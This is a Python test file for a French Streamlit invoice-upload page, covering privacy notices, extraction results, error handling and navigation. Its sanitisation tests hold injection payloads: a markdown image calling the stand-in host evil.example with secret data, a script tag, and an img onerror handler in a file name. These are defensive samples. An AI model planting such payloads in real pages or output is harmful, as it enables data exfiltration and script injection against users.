from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src.ui import services
from src.ui.errors import ApiError
from src.ui.models import InvoiceData, InvoiceView
from src.ui.pages import upload as upload_module  # noqa: F401 - keeps the import path checked
from src.ui.safe import safe
from src.ui.upload_logic import Outcome

ROOT = Path(__file__).resolve().parents[2]
PAGE = str(ROOT / "src" / "ui" / "pages" / "upload.py")
APP = str(ROOT / "src" / "ui" / "app.py")
PDF = b"%PDF-1.4 a small pdf"
NOW = datetime(2026, 9, 21, 12, 0, tzinfo=UTC)
RECORD_ID = "3f9a1c2e-7b4d-4e8a-9c31-5d2f0a6b8e14"
HOSTILE = "![x](http://evil.example/?d=secret) <script>alert(1)</script>"


def _view(supplier: str = "Orange SA", total: float = 1234.5, warnings=()) -> InvoiceView:
    return InvoiceView(
        id=RECORD_ID,
        created_at=NOW,
        expires_at=NOW + timedelta(days=30),
        display_name="f.pdf",
        status="low" if warnings else "high",
        invoice=InvoiceData(supplier=supplier, total_ttc=total, warnings=list(warnings)),
    )


class FakeClient:
    def __init__(self, *answers) -> None:
        self.answers = list(answers)
        self.sent: list[tuple[str, bytes]] = []

    def check(self) -> None:
        return None

    def get(self, record_id: str) -> InvoiceView:  # the Result page loads the record
        return _view()

    def upload(self, filename: str, data: bytes, mime: str) -> InvoiceView:
        self.sent.append((filename, data))
        answer = self.answers.pop(0) if self.answers else _view()
        if isinstance(answer, Exception):
            raise answer
        return answer


def _page(monkeypatch: pytest.MonkeyPatch, client: FakeClient) -> AppTest:
    monkeypatch.setattr(services, "get_client", lambda: client)
    return AppTest.from_file(PAGE, default_timeout=30).run()


def _send(app: AppTest, name: str = "facture.pdf", data: bytes = PDF) -> AppTest:
    app.file_uploader[0].upload(name, data, "application/pdf").run()
    app.button[0].click().run()
    return app


# --- the page before anything happens ---
def test_the_page_explains_privacy_and_limits_before_any_upload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    app = _page(monkeypatch, FakeClient())
    assert not app.exception and [t.value for t in app.title] == [
        "📤 Uploader une facture ou un devis"
    ]
    notice = app.expander[0].markdown[0].value
    assert "supprimé du serveur" in notice and "masqués" in notice
    assert "20 extractions par jour" in notice and "factures fictives" in notice
    assert app.button[0].disabled  # nothing to send yet
    assert not app.subheader  # no results section


# --- a successful extraction ---
def test_a_successful_upload_shows_the_result_and_empties_the_selection(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    client = FakeClient(_view("Orange SA", 1234.5))
    app = _page(monkeypatch, client)
    app.file_uploader[0].upload("facture.pdf", PDF, "application/pdf").run()
    assert not app.button[0].disabled  # a file is selected: the button is enabled

    app.button[0].click().run()

    assert client.sent == [("facture.pdf", PDF)]
    assert not app.exception and [s.value for s in app.subheader] == ["Résultats"]
    line = app.success[0].value
    assert "facture" in line and "Orange SA" in line and "1 234,50 €" in line
    assert "✅ Fiable" in line
    assert not app.file_uploader[0].value  # a fresh uploader for the next batch


def test_extraction_warnings_are_shown_and_the_result_is_marked_for_review(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    app = _page(monkeypatch, FakeClient(_view(warnings=["Line 1: quantity * unit_price = 20.00"])))
    _send(app)
    assert "À vérifier" in app.success[0].value
    assert any("Line 1" in caption.value for caption in app.caption)


def test_hostile_text_from_the_pdf_never_becomes_markup(monkeypatch: pytest.MonkeyPatch) -> None:
    # a real file name cannot contain "/" (no operating system allows it), but it can hold markup
    hostile_name = "![x](evil)<img src=x onerror=alert(1)>.pdf"
    app = _page(monkeypatch, FakeClient(_view(supplier=HOSTILE)))
    _send(app, name=hostile_name)
    shown = app.success[0].value
    assert safe(HOSTILE) in shown and safe(hostile_name) in shown  # both go through safe()
    assert "<script>" not in shown and "<img" not in shown.replace("\\<img", "")


# --- what goes wrong ---
def test_a_file_that_is_not_a_pdf_is_skipped_without_a_request(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    client = FakeClient()
    app = _page(monkeypatch, client)
    _send(app, name="fake.pdf", data=b"MZ\x90\x00 an executable renamed .pdf")
    assert client.sent == []
    assert "format non reconnu" in app.warning[0].value


def test_a_refusal_by_the_api_is_shown_with_its_message_and_the_retry_delay(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    client = FakeClient(ApiError(429, "Trop de requêtes, réessayez dans quelques instants.", 42))
    app = _page(monkeypatch, client)
    _send(app)
    message = app.error[0].value
    assert "Trop de requêtes" in message and "Réessayez dans 42 s" in message


def test_an_api_message_cannot_inject_markup(monkeypatch: pytest.MonkeyPatch) -> None:
    app = _page(monkeypatch, FakeClient(ApiError(422, HOSTILE)))
    _send(app)
    assert safe(HOSTILE) in app.error[0].value and "<script>" not in app.error[0].value


# --- results kept between reruns ---
def _seeded(monkeypatch: pytest.MonkeyPatch, outcomes: list[Outcome]) -> AppTest:
    monkeypatch.setattr(services, "get_client", lambda: FakeClient())
    app = AppTest.from_file(PAGE, default_timeout=30)
    app.session_state["upload_results"] = outcomes
    return app.run()


def test_every_kind_of_outcome_has_its_own_presentation(monkeypatch: pytest.MonkeyPatch) -> None:
    app = _seeded(
        monkeypatch,
        [
            Outcome("a.pdf", "ok", record=_view()),
            Outcome("b.pdf", "skipped", "Ignoré : fichier vide."),
            Outcome("c.pdf", "error", "Le PDF est illisible ou corrompu."),
            Outcome("d.pdf", "not_run", "Non traité : arrêt du lot."),
        ],
    )
    assert len(app.success) == 1 and len(app.warning) == 1 and len(app.error) == 1
    assert len(app.info) == 1 and "arrêt du lot" in app.info[0].value


def test_the_results_can_be_cleared(monkeypatch: pytest.MonkeyPatch) -> None:
    app = _seeded(monkeypatch, [Outcome("a.pdf", "ok", record=_view())])
    clear = next(button for button in app.button if button.label == "Effacer les résultats")
    clear.click().run()
    assert not app.subheader and not app.success


def test_opening_a_result_remembers_it_and_goes_to_the_result_page(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(services, "get_client", lambda: FakeClient())
    app = AppTest.from_file(APP, default_timeout=30)
    app.session_state["upload_results"] = [Outcome("a.pdf", "ok", record=_view())]
    app.run()
    next(button for button in app.button if button.label == "Voir le résultat").click().run()
    assert not app.exception
    assert app.session_state["current_record_id"] == RECORD_ID
    assert any("Résultat de l'extraction" in title.value for title in app.title)
    assert any(field.value == "Orange SA" for field in app.text_input)  # the record is shown
